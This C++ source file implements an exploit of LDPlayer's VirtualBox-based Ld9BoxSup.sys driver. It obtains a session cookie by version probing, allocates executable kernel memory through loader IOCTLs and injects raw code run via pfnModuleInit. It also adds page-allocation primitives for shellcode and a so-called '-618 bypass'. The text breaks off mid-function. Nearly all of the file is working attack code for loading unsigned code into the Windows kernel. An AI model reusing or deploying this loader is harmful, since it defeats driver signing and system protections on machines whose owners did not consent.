/**
 * @file supdrv_loader.cpp
 * @brief SUPDrv exploitation implementation
 *
 * Exploits Ld9BoxSup.sys (LDPlayer's VirtualBox 6.1.36 driver) to:
 * 1. Acquire session cookie via version probing
 * 2. Allocate executable kernel memory
 * 3. Load hypervisor payload and execute pfnModuleInit
 */

#include "supdrv_loader.h"
#include "../debug.h"
#include <cstdio>
#include <cstdarg>
#include <cstring>
#include <vector>

// NT types for NtCreateFile (VirtualBox/LDPlayer drivers don't create DosDevices symlinks!)
typedef struct _SUP_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} SUP_UNICODE_STRING, *PSUP_UNICODE_STRING;

typedef struct _SUP_OBJECT_ATTRIBUTES {
    ULONG           Length;
    HANDLE          RootDirectory;
    PSUP_UNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} SUP_OBJECT_ATTRIBUTES, *PSUP_OBJECT_ATTRIBUTES;

typedef struct _SUP_IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID    Pointer;
    };
    ULONG_PTR Information;
} SUP_IO_STATUS_BLOCK, *PSUP_IO_STATUS_BLOCK;

typedef VOID(NTAPI* PFN_SRtlInitUnicodeString)(PSUP_UNICODE_STRING, PCWSTR);
typedef NTSTATUS(NTAPI* PFN_SNtCreateFile)(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    PSUP_OBJECT_ATTRIBUTES ObjectAttributes,
    PSUP_IO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength);

#define SUP_OBJ_CASE_INSENSITIVE     0x00000040L
#define SUP_FILE_NON_DIRECTORY_FILE  0x00000040
#define SUP_FILE_OPEN                0x00000001

#define InitializeSUPObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(SUP_OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
}

// NT types for NtQuerySystemInformation
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

typedef NTSTATUS(NTAPI* PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

constexpr ULONG SystemModuleInformation = 11;

namespace supdrv {

//-----------------------------------------------------------------------------
// Static helper: Get driver base address
//-----------------------------------------------------------------------------

uint64_t SUPDrvLoader::GetDriverBaseAddress(const wchar_t* wszDriverName)
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return 0;
    }

    auto NtQuerySystemInformation = reinterpret_cast<PFN_NtQuerySystemInformation>(
        GetProcAddress(hNtdll, "NtQuerySystemInformation"));
    if (!NtQuerySystemInformation) {
        return 0;
    }

    // First call to get required buffer size
    ULONG cbNeeded = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &cbNeeded);
    if (cbNeeded == 0) {
        return 0;
    }

    // Allocate buffer
    std::vector<uint8_t> buffer(cbNeeded + 0x1000);  // Extra padding
    auto pModules = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer.data());

    status = NtQuerySystemInformation(SystemModuleInformation, pModules,
                                       static_cast<ULONG>(buffer.size()), &cbNeeded);
    if (status < 0) {  // !NT_SUCCESS
        return 0;
    }

    // Convert wide string to narrow for comparison
    char szDriverName[256] = {0};
    WideCharToMultiByte(CP_ACP, 0, wszDriverName, -1, szDriverName, sizeof(szDriverName), nullptr, nullptr);
    _strlwr_s(szDriverName);

    // Search for driver
    for (ULONG i = 0; i < pModules->NumberOfModules; i++) {
        const char* pFullPath = reinterpret_cast<const char*>(pModules->Modules[i].FullPathName);
        const char* pFileName = pFullPath + pModules->Modules[i].OffsetToFileName;

        // Case-insensitive compare
        char szFileName[256];
        strncpy_s(szFileName, pFileName, _TRUNCATE);
        _strlwr_s(szFileName);

        if (strstr(szFileName, szDriverName) != nullptr) {
            return reinterpret_cast<uint64_t>(pModules->Modules[i].ImageBase);
        }
    }

    return 0;
}

//-----------------------------------------------------------------------------
// Constructor / Destructor
//-----------------------------------------------------------------------------

SUPDrvLoader::SUPDrvLoader()
    : m_hDevice(INVALID_HANDLE_VALUE)
    , m_Cookie{}
    , m_DetectedVersion(0)
    , m_bInitialized(false)
    , m_pvAllocatedBase(nullptr)
    , m_cbAllocatedSize(0)
{
}

SUPDrvLoader::~SUPDrvLoader()
{
    Cleanup();
}

//-----------------------------------------------------------------------------
// Error handling
//-----------------------------------------------------------------------------

void SUPDrvLoader::SetError(const char* format, ...)
{
    char buffer[1024];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    m_LastError = buffer;
}

//-----------------------------------------------------------------------------
// Device operations - uses NtCreateFile for NT device paths
//-----------------------------------------------------------------------------

HANDLE SUPDrvLoader::TryOpenDevice(const wchar_t* deviceName)
{
    DbgLog("    [SUPDrvLoader::TryOpenDevice] Trying: %ls", deviceName);

    // VirtualBox/LDPlayer drivers do NOT create DosDevices symbolic links!
    // Must use NtCreateFile with NT device paths like \Device\Ld9BoxDrv

    // Get ntdll functions
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        DbgLog("    [SUPDrvLoader::TryOpenDevice] FAILED: Could not get ntdll");
        return INVALID_HANDLE_VALUE;
    }

    auto RtlInitUnicodeString = reinterpret_cast<PFN_SRtlInitUnicodeString>(
        GetProcAddress(hNtdll, "RtlInitUnicodeString"));
    auto NtCreateFile = reinterpret_cast<PFN_SNtCreateFile>(
        GetProcAddress(hNtdll, "NtCreateFile"));

    if (!RtlInitUnicodeString || !NtCreateFile) {
        DbgLog("    [SUPDrvLoader::TryOpenDevice] FAILED: Could not resolve ntdll functions");
        return INVALID_HANDLE_VALUE;
    }

    // Convert DosDevices path (\\.\Ld9BoxDrv) to NT path (\Device\Ld9BoxDrv)
    std::wstring ntPath;
    if (wcsncmp(deviceName, L"\\\\.\\", 4) == 0) {
        ntPath = L"\\Device\\";
        ntPath += (deviceName + 4);
        DbgLog("    [SUPDrvLoader::TryOpenDevice] Converted to NT path: %ls", ntPath.c_str());
    } else if (wcsncmp(deviceName, L"\\Device\\", 8) == 0) {
        ntPath = deviceName;
    } else {
        DbgLog("    [SUPDrvLoader::TryOpenDevice] FAILED: Unknown path format");
        return INVALID_HANDLE_VALUE;
    }

    // Initialize UNICODE_STRING for the device path
    SUP_UNICODE_STRING usDeviceName;
    RtlInitUnicodeString(&usDeviceName, ntPath.c_str());

    // Initialize OBJECT_ATTRIBUTES
    SUP_OBJECT_ATTRIBUTES objAttr;
    InitializeSUPObjectAttributes(&objAttr, &usDeviceName, SUP_OBJ_CASE_INSENSITIVE, NULL, NULL);

    // Open the device using NtCreateFile
    SUP_IO_STATUS_BLOCK ioStatus = {};
    HANDLE hDevice = INVALID_HANDLE_VALUE;

    NTSTATUS status = NtCreateFile(
        &hDevice,
        GENERIC_READ | GENERIC_WRITE,
        &objAttr,
        &ioStatus,
        NULL,               // AllocationSize
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        SUP_FILE_OPEN,      // CreateDisposition - open existing
        SUP_FILE_NON_DIRECTORY_FILE,
        NULL,               // EaBuffer
        0                   // EaLength
    );

    if (status < 0) {  // !NT_SUCCESS
        DbgLog("    [SUPDrvLoader::TryOpenDevice] FAILED: NtCreateFile returned 0x%08X", status);
        return INVALID_HANDLE_VALUE;
    }

    DbgLog("    [SUPDrvLoader::TryOpenDevice] SUCCESS: handle=%p", hDevice);
    return hDevice;
}

bool SUPDrvLoader::OpenDevice()
{
    // Try LDPlayer device first (primary target: \\.\Ld9BoxDrv)
    m_hDevice = TryOpenDevice(DEVICE_NAME_LDPLAYER);
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        m_DeviceName = DEVICE_NAME_LDPLAYER;
        return true;
    }

    // Try LDPlayer user-mode variant (\\.\Ld9BoxDrvU)
    m_hDevice = TryOpenDevice(DEVICE_NAME_LDPLAYER_USER);
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        m_DeviceName = DEVICE_NAME_LDPLAYER_USER;
        return true;
    }

    // Fallback to standard VBoxDrv
    m_hDevice = TryOpenDevice(DEVICE_NAME_VBOX);
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        m_DeviceName = DEVICE_NAME_VBOX;
        return true;
    }

    SetError("Failed to open SUPDrv device. Error: %lu. "
             "Ensure LDPlayer is installed or VBoxDrv is available.",
             GetLastError());
    return false;
}

//-----------------------------------------------------------------------------
// Version probing and cookie acquisition
//-----------------------------------------------------------------------------

bool SUPDrvLoader::TryCookieWithVersion(uint32_t version)
{
    DbgLog("      [TryCookieWithVersion] Trying version 0x%08X...", version);

    SUPCOOKIE cookie = {};

    // Setup request header
    cookie.Hdr.u32Cookie = SUPCOOKIE_INITIAL_COOKIE;
    cookie.Hdr.u32SessionCookie = GetTickCount();  // Random session cookie
    cookie.Hdr.cbIn = static_cast<uint32_t>(SUP_IOCTL_COOKIE_SIZE_IN);
    cookie.Hdr.cbOut = static_cast<uint32_t>(SUP_IOCTL_COOKIE_SIZE_OUT);
    cookie.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    cookie.Hdr.rc = VERR_INTERNAL_ERROR;

    // Setup cookie input
    cookie.u.In.u32ReqVersion = version;
    cookie.u.In.u32MinVersion = version & 0xFFFF0000;  // Major version only
    memcpy(cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));

    // DeviceIoControl buffer sizes: MUST exactly match what the driver expects.
    // VirtualBox SUPDrvNt-win.cpp validation checks:
    //   if (pIrp->Parameters.DeviceIoControl.InputBufferLength != pReq->cbIn) fail;
    //   if (pIrp->Parameters.DeviceIoControl.OutputBufferLength != pReq->cbOut) fail;
    // So we MUST pass cbIn for input and cbOut for output - not sizeof(cookie) for both!
    DWORD nInBufferSize = cookie.Hdr.cbIn;    // Must be 48 (0x30)
    DWORD nOutBufferSize = cookie.Hdr.cbOut;  // Must be 56 (0x38)

    DbgLog("      [TryCookieWithVersion] IOCTL=0x%08X nInBuf=%u nOutBuf=%u sizeof(cookie)=%zu",
           SUP_IOCTL_COOKIE, nInBufferSize, nOutBufferSize, sizeof(cookie));

    // Hex dump first 56 bytes of cookie structure
    const uint8_t* pBytes = reinterpret_cast<const uint8_t*>(&cookie);
    DbgLog("      [HEX] Offset 0x00: %02X %02X %02X %02X %02X %02X %02X %02X  %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[0], pBytes[1], pBytes[2], pBytes[3], pBytes[4], pBytes[5], pBytes[6], pBytes[7],
           pBytes[8], pBytes[9], pBytes[10], pBytes[11], pBytes[12], pBytes[13], pBytes[14], pBytes[15]);
    DbgLog("      [HEX] Offset 0x10: %02X %02X %02X %02X %02X %02X %02X %02X  %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[16], pBytes[17], pBytes[18], pBytes[19], pBytes[20], pBytes[21], pBytes[22], pBytes[23],
           pBytes[24], pBytes[25], pBytes[26], pBytes[27], pBytes[28], pBytes[29], pBytes[30], pBytes[31]);
    DbgLog("      [HEX] Offset 0x20: %02X %02X %02X %02X %02X %02X %02X %02X  %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[32], pBytes[33], pBytes[34], pBytes[35], pBytes[36], pBytes[37], pBytes[38], pBytes[39],
           pBytes[40], pBytes[41], pBytes[42], pBytes[43], pBytes[44], pBytes[45], pBytes[46], pBytes[47]);
    DbgLog("      [HEX] Offset 0x30: %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[48], pBytes[49], pBytes[50], pBytes[51], pBytes[52], pBytes[53], pBytes[54], pBytes[55]);

    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_COOKIE,
        &cookie,
        nInBufferSize,   // Use exact size from header
        &cookie,
        nOutBufferSize,  // Use exact size from header
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();  // Use :: to avoid calling member GetLastError()
        DbgLog("      [TryCookieWithVersion] DeviceIoControl FAILED: Win32 error %lu", err);
        return false;
    }

    DbgLog("      [TryCookieWithVersion] DeviceIoControl OK: returned=%lu VBox rc=%d",
           dwReturned, cookie.Hdr.rc);

    if (cookie.Hdr.rc == VINF_SUCCESS) {
        DbgLog("      [TryCookieWithVersion] SUCCESS! Cookie=0x%08X Session=0x%08X DriverVer=0x%08X",
               cookie.u.Out.u32Cookie, cookie.u.Out.u32SessionCookie, cookie.u.Out.u32DriverVersion);
        m_Cookie = cookie;
        m_DetectedVersion = version;
        return true;
    }

    // Log the specific error
    DbgLog("      [TryCookieWithVersion] VBox error: %d", cookie.Hdr.rc);
    if (cookie.Hdr.rc == VERR_VM_DRIVER_VERSION_MISMATCH) {
        DbgLog("      [TryCookieWithVersion] -> VERR_VM_DRIVER_VERSION_MISMATCH (try different version)");
    }

    return false;
}

bool SUPDrvLoader::ProbeVersionAndAcquireCookie()
{
    // Try each known version in order (most likely first)
    for (size_t i = 0; i < KNOWN_VERSIONS_COUNT; i++) {
        uint32_t version = KNOWN_VERSIONS[i];

        if (TryCookieWithVersion(version)) {
            // Success - log the session info
            return true;
        }
    }

    SetError("Version probe failed: exhausted all known versions. "
             "Driver may be incompatible or from an unknown VBox build.");
    return false;
}

//-----------------------------------------------------------------------------
// Public API
//-----------------------------------------------------------------------------

bool SUPDrvLoader::Initialize()
{
    if (m_bInitialized) {
        return true;  // Already initialized
    }

    // Step 1: Open device
    if (!OpenDevice()) {
        return false;
    }

    // Step 2: Probe version and acquire cookie
    if (!ProbeVersionAndAcquireCookie()) {
        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
        return false;
    }

    m_bInitialized = true;
    return true;
}

bool SUPDrvLoader::Initialize(HANDLE hDevice, const wchar_t* wszDeviceName)
{
    DbgLog("[SUPDrvLoader::Initialize] Using existing handle: %p", hDevice);

    if (m_bInitialized) {
        DbgLog("[SUPDrvLoader::Initialize] Already initialized");
        return true;
    }

    if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL) {
        DbgLog("[SUPDrvLoader::Initialize] FAILED: Invalid handle provided");
        SetError("Invalid device handle provided");
        return false;
    }

    // Take ownership of the handle
    m_hDevice = hDevice;
    m_DeviceName = wszDeviceName ? wszDeviceName : L"(provided)";

    DbgLog("[SUPDrvLoader::Initialize] Device name: %ls", m_DeviceName.c_str());

    // Probe version and acquire cookie
    DbgLog("[SUPDrvLoader::Initialize] Probing version and acquiring cookie...");
    if (!ProbeVersionAndAcquireCookie()) {
        DbgLog("[SUPDrvLoader::Initialize] FAILED: Version probe failed");
        // Don't close the handle - caller may still want to use it
        m_hDevice = INVALID_HANDLE_VALUE;
        return false;
    }

    DbgLog("[SUPDrvLoader::Initialize] SUCCESS: Version=0x%08X Cookie=0x%08X Session=0x%llX",
           m_DetectedVersion, m_Cookie.u.Out.u32Cookie, m_Cookie.u.Out.pSession);

    m_bInitialized = true;
    return true;
}

void* SUPDrvLoader::AllocateKernelMemory(size_t cbSize, const char* szModuleName)
{
    if (!m_bInitialized) {
        SetError("SUPDrvLoader not initialized");
        return nullptr;
    }

    if (m_pvAllocatedBase != nullptr) {
        SetError("Memory already allocated. Call LoadAndExecute or Cleanup first.");
        return nullptr;
    }

    SUPLDROPEN ldrOpen = {};

    // Setup request header with session cookies
    // Header cbIn/cbOut must match the VBox-defined IOCTL sizes (verified from binary):
    // - cbIn = 328 (0x148) = SUPREQHDR + In structure
    // - cbOut = 40 (0x28) = SUPREQHDR + Out structure (pvImageBase + fNativeLoader + padding)
    ldrOpen.Hdr.u32Cookie = m_Cookie.u.Out.u32Cookie;
    ldrOpen.Hdr.u32SessionCookie = m_Cookie.u.Out.u32SessionCookie;
    ldrOpen.Hdr.cbIn = static_cast<uint32_t>(SUP_IOCTL_LDR_OPEN_SIZE_IN);   // 328 (0x148)
    ldrOpen.Hdr.cbOut = static_cast<uint32_t>(SUP_IOCTL_LDR_OPEN_SIZE_OUT); // 40 (0x28)
    ldrOpen.Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    ldrOpen.Hdr.rc = VERR_INTERNAL_ERROR;

    // Setup LDR_OPEN input
    // CRITICAL: Binary disassembly at 0x1400074e4 reveals validation:
    //   cmp cbImageBits, cbImageWithTabs
    //   jb continue  ; Jump if cbImageBits < cbImageWithTabs (strictly less than!)
    // If cbImageBits >= cbImageWithTabs, the driver rejects the request.
    // So we must ensure cbImageBits < cbImageWithTabs!
    //
    // VirtualBox semantics:
    //   cbImageWithTabs = total image size including symbol/string tables
    //   cbImageBits = just code + data (without symbols)
    // For raw code injection with no symbols, we fake it by adding 1 to cbImageWithTabs.
    ldrOpen.u.In.cbImageWithTabs = static_cast<uint32_t>(cbSize + 1);  // +1 for fake symbol table
    ldrOpen.u.In.cbImageBits = static_cast<uint32_t>(cbSize);          // Actual code size (must be < cbImageWithTabs)

    // Module name (arbitrary, used for internal tracking)
    strncpy_s(ldrOpen.u.In.szName, sizeof(ldrOpen.u.In.szName),
              szModuleName, _TRUNCATE);

    // Filename (ignored by driver, can be fake)
    strncpy_s(ldrOpen.u.In.szFilename, sizeof(ldrOpen.u.In.szFilename),
              "\\SystemRoot\\OmbraHv.sys", _TRUNCATE);

    // DeviceIoControl buffer sizes for METHOD_BUFFERED IOCTLs:
    //
    // VBox driver validates InputBufferLength == cbIn AND OutputBufferLength == cbOut (strict equality).
    // The IRP preprocessing uses MAX(InputBufferLength, OutputBufferLength) as buffer_size for:
    //   cmp cbIn, buffer_size    ; cbIn <= MAX(in, out)
    //   cmp cbOut, buffer_size   ; cbOut <= MAX(in, out)
    //
    // Both checks pass when using the correct VBox-defined sizes:
    //   - IRP preprocessing: cbIn (328) <= MAX(328, 40) = 328 ✓
    //   - IRP preprocessing: cbOut (40) <= MAX(328, 40) = 328 ✓
    //   - VBox equality: InputBufferLength (328) == cbIn (328) ✓
    //   - VBox equality: OutputBufferLength (40) == cbOut (40) ✓
    DWORD nInBufferSize = ldrOpen.Hdr.cbIn;    // 328 - must match header exactly
    DWORD nOutBufferSize = ldrOpen.Hdr.cbOut;  // 40 - must match header exactly

    DbgLog("[SUPDrvLoader::AllocateKernelMemory] IOCTL=0x%08X nInBuf=%u nOutBuf=%u",
           SUP_IOCTL_LDR_OPEN, nInBufferSize, nOutBufferSize);
    DbgLog("[SUPDrvLoader::AllocateKernelMemory] cbImageWithTabs=%u cbImageBits=%u szName=%.32s",
           ldrOpen.u.In.cbImageWithTabs, ldrOpen.u.In.cbImageBits, ldrOpen.u.In.szName);

    // Hex dump of first 48 bytes of the request (header + start of input)
    const uint8_t* pBytes = reinterpret_cast<const uint8_t*>(&ldrOpen);
    DbgLog("[HEX] +00: %02X %02X %02X %02X %02X %02X %02X %02X  %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[0], pBytes[1], pBytes[2], pBytes[3], pBytes[4], pBytes[5], pBytes[6], pBytes[7],
           pBytes[8], pBytes[9], pBytes[10], pBytes[11], pBytes[12], pBytes[13], pBytes[14], pBytes[15]);
    DbgLog("[HEX] +16: %02X %02X %02X %02X %02X %02X %02X %02X  %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[16], pBytes[17], pBytes[18], pBytes[19], pBytes[20], pBytes[21], pBytes[22], pBytes[23],
           pBytes[24], pBytes[25], pBytes[26], pBytes[27], pBytes[28], pBytes[29], pBytes[30], pBytes[31]);
    DbgLog("[HEX] +32: %02X %02X %02X %02X %02X %02X %02X %02X  %02X %02X %02X %02X %02X %02X %02X %02X",
           pBytes[32], pBytes[33], pBytes[34], pBytes[35], pBytes[36], pBytes[37], pBytes[38], pBytes[39],
           pBytes[40], pBytes[41], pBytes[42], pBytes[43], pBytes[44], pBytes[45], pBytes[46], pBytes[47]);

    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_LDR_OPEN,
        &ldrOpen,
        nInBufferSize,    // 328 = cbIn (must match header)
        &ldrOpen,
        nOutBufferSize,   // 40 = cbOut (must match header)
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();
        SetError("SUP_IOCTL_LDR_OPEN DeviceIoControl failed. Error: %lu (0x%08lX)",
                 err, err);
        return nullptr;
    }

    if (ldrOpen.Hdr.rc != VINF_SUCCESS) {
        SetError("SUP_IOCTL_LDR_OPEN failed with VBox error: %d", ldrOpen.Hdr.rc);
        return nullptr;
    }

    void* pvImageBase = ldrOpen.u.Out.pvImageBase;

    // Validate kernel address
    if (!IsKernelAddress(pvImageBase)) {
        SetError("LDR_OPEN returned invalid address: %p (expected kernel space)",
                 pvImageBase);
        return nullptr;
    }

    m_pvAllocatedBase = pvImageBase;
    m_cbAllocatedSize = cbSize;

    return pvImageBase;
}

bool SUPDrvLoader::LoadAndExecute(void* pvKernelBase, const void* pvCode,
                                   size_t cbCode, size_t pfnEntryPointOffset)
{
    if (!m_bInitialized) {
        SetError("SUPDrvLoader not initialized");
        return false;
    }

    if (pvKernelBase != m_pvAllocatedBase) {
        SetError("pvKernelBase doesn't match allocated base");
        return false;
    }

    if (cbCode > m_cbAllocatedSize) {
        SetError("Code size (%zu) exceeds allocated size (%zu)",
                 cbCode, m_cbAllocatedSize);
        return false;
    }

    // Calculate total structure size
    size_t cbTotal = SUPLDRLOAD_BASE_SIZE + cbCode;

    // Allocate variable-size SUPLDRLOAD structure
    std::vector<uint8_t> buffer(cbTotal, 0);
    PSUPLDRLOAD pLdrLoad = reinterpret_cast<PSUPLDRLOAD>(buffer.data());

    // Setup request header
    pLdrLoad->Hdr.u32Cookie = m_Cookie.u.Out.u32Cookie;
    pLdrLoad->Hdr.u32SessionCookie = m_Cookie.u.Out.u32SessionCookie;
    pLdrLoad->Hdr.cbIn = static_cast<uint32_t>(cbTotal);
    pLdrLoad->Hdr.cbOut = static_cast<uint32_t>(SUP_IOCTL_LDR_LOAD_SIZE_OUT);
    pLdrLoad->Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT | SUPREQHDR_FLAGS_EXTRA_IN;
    pLdrLoad->Hdr.rc = VERR_INTERNAL_ERROR;

    // Setup LDR_LOAD input
    // CRITICAL: cbImageWithTabs must match what we passed to LDR_OPEN (cbCode + 1)
    // The driver validates these match the previously registered values.
    pLdrLoad->u.In.pvImageBase = pvKernelBase;
    pLdrLoad->u.In.cbImageWithTabs = static_cast<uint32_t>(cbCode + 1);  // Must match LDR_OPEN
    pLdrLoad->u.In.cbImageBits = static_cast<uint32_t>(cbCode);          // Actual code size

    // No symbol/string tables (raw code)
    pLdrLoad->u.In.offSymbols = 0;
    pLdrLoad->u.In.cSymbols = 0;
    pLdrLoad->u.In.offStrTab = 0;
    pLdrLoad->u.In.cbStrTab = 0;

    // Entry point type - SERVICE means pfnModuleInit will be called
    pLdrLoad->u.In.eEPType = SUPLDRLOADEP_SERVICE;

    // CRITICAL: pfnModuleInit is called by the driver after load!
    // Set it to our entry point within the image
    uint8_t* pEntryPoint = static_cast<uint8_t*>(pvKernelBase) + pfnEntryPointOffset;
    pLdrLoad->u.In.pfnModuleInit = pEntryPoint;
    pLdrLoad->u.In.pfnModuleTerm = nullptr;  // No termination handler

    // VMM-specific fields (not used for SERVICE type)
    pLdrLoad->u.In.pvVMMR0 = nullptr;
    pLdrLoad->u.In.pvVMMR0EntryFast = nullptr;
    pLdrLoad->u.In.pvVMMR0EntryEx = nullptr;

    // Copy image data into the structure
    memcpy(pLdrLoad->u.In.abImage, pvCode, cbCode);

    // VBox validates InputBufferLength == cbIn AND OutputBufferLength == cbOut (strict equality).
    // Same MAX(in, out) logic as LDR_OPEN - IRP preprocessing uses MAX for its <= checks.
    DWORD nInBufferSize = pLdrLoad->Hdr.cbIn;    // cbTotal (varies with image size)
    DWORD nOutBufferSize = pLdrLoad->Hdr.cbOut;  // cbOut - must match header exactly

    DbgLog("[SUPDrvLoader::LoadAndExecute] IOCTL=0x%08X cbIn=%u cbOut=%u cbTotal=%zu",
           SUP_IOCTL_LDR_LOAD, nInBufferSize, nOutBufferSize, cbTotal);
    DbgLog("[SUPDrvLoader::LoadAndExecute] pvImageBase=%p pfnModuleInit=%p cbCode=%zu",
           pvKernelBase, pLdrLoad->u.In.pfnModuleInit, cbCode);

    // Execute the load
    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_LDR_LOAD,
        pLdrLoad,
        nInBufferSize,    // cbTotal = cbIn (must match header)
        pLdrLoad,
        nOutBufferSize,   // cbOut (must match header)
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();
        SetError("SUP_IOCTL_LDR_LOAD DeviceIoControl failed. Error: %lu (0x%08lX)",
                 err, err);
        return false;
    }

    if (pLdrLoad->Hdr.rc != VINF_SUCCESS) {
        // Check for common error codes
        switch (pLdrLoad->Hdr.rc) {
        case VERR_ALREADY_LOADED:
            SetError("Module already loaded (VERR_ALREADY_LOADED). "
                     "May need to restart or unload existing module.");
            break;
        case VERR_LDR_GENERAL_FAILURE:
            SetError("LDR general failure. pfnModuleInit may have returned non-zero.");
            break;
        case VERR_INVALID_PARAMETER:
            SetError("Invalid parameter in LDR_LOAD request.");
            break;
        default:
            SetError("SUP_IOCTL_LDR_LOAD failed with VBox error: %d",
                     pLdrLoad->Hdr.rc);
        }
        return false;
    }

    // Success! pfnModuleInit has been called and returned 0
    // The hypervisor should now be active
    return true;
}

void SUPDrvLoader::Cleanup()
{
    if (m_hDevice != INVALID_HANDLE_VALUE) {
        // Note: We don't unload the module here because:
        // 1. The hypervisor should remain active
        // 2. SUPDrv doesn't have a clean unload for in-use modules
        // 3. Unloading would crash the system if VMExits are being handled

        CloseHandle(m_hDevice);
        m_hDevice = INVALID_HANDLE_VALUE;
    }

    m_bInitialized = false;
    m_DetectedVersion = 0;
    m_pvAllocatedBase = nullptr;
    m_cbAllocatedSize = 0;
    m_Cookie = {};
    m_DeviceName.clear();
}

//-----------------------------------------------------------------------------
// Self-patching primitives for -618 bypass
//-----------------------------------------------------------------------------

bool SUPDrvLoader::PageAllocEx(uint32_t cPages, void** ppvR3, void** ppvR0)
{
    if (!m_bInitialized) {
        SetError("SUPDrvLoader not initialized");
        return false;
    }

    if (cPages == 0 || !ppvR3 || !ppvR0) {
        SetError("Invalid parameters for PageAllocEx");
        return false;
    }

    // Calculate output buffer size (includes physical page array)
    size_t cbOut = SUP_IOCTL_PAGE_ALLOC_EX_SIZE_OUT(cPages);

    // Allocate buffer for response (needs room for physical addresses)
    std::vector<uint8_t> buffer(sizeof(SUPPAGEALLOCEX) + cPages * sizeof(uint64_t), 0);
    PSUPPAGEALLOCEX pAlloc = reinterpret_cast<PSUPPAGEALLOCEX>(buffer.data());

    // Setup request header
    pAlloc->Hdr.u32Cookie = m_Cookie.u.Out.u32Cookie;
    pAlloc->Hdr.u32SessionCookie = m_Cookie.u.Out.u32SessionCookie;
    pAlloc->Hdr.cbIn = static_cast<uint32_t>(SUP_IOCTL_PAGE_ALLOC_EX_SIZE_IN);
    pAlloc->Hdr.cbOut = static_cast<uint32_t>(cbOut);
    pAlloc->Hdr.fFlags = SUPREQHDR_FLAGS_DEFAULT;
    pAlloc->Hdr.rc = VERR_INTERNAL_ERROR;

    // Setup input - request both R3 and R0 mappings
    pAlloc->u.In.cPages = cPages;
    pAlloc->u.In.fKernelMapping = 1;  // We need R0 for shellcode execution
    pAlloc->u.In.fUserMapping = 1;    // We need R3 for writing shellcode
    pAlloc->u.In.fReserved0 = 0;
    pAlloc->u.In.fReserved1 = 0;

    DbgLog("[SUPDrvLoader::PageAllocEx] IOCTL=0x%08X cPages=%u cbIn=%u cbOut=%zu",
           SUP_IOCTL_PAGE_ALLOC_EX, cPages, pAlloc->Hdr.cbIn, cbOut);

    DWORD dwReturned = 0;
    BOOL bResult = DeviceIoControl(
        m_hDevice,
        SUP_IOCTL_PAGE_ALLOC_EX,
        pAlloc,
        pAlloc->Hdr.cbIn,
        pAlloc,
        static_cast<DWORD>(cbOut),
        &dwReturned,
        NULL
    );

    if (!bResult) {
        DWORD err = ::GetLastError();
        SetError("SUP_IOCTL_PAGE_ALLOC_EX DeviceIoControl failed. Error: %lu", err);
        return false;
    }

    if (pAlloc->Hdr.rc != VINF_SUCCESS) {
        SetError("SUP_IOCTL_PAGE_ALLOC_EX failed with VBox error: %d", pAlloc->Hdr.rc);
        return false;
    }

    *ppvR3 = reinterpret_cast<void*>(pAlloc->u.Out.pvR3);
    *ppvR0 = reinterpret_cast<void*>(pAlloc->u.Out.pvR0);

    DbgLog("[SUPDrvLoader::PageAllocEx] SUCCESS: pvR3=%p pvR0=%p",
           *ppvR3, *ppvR0);

    return true;
}

bool SUPDrvLoader::PageFree(void* pvR3)
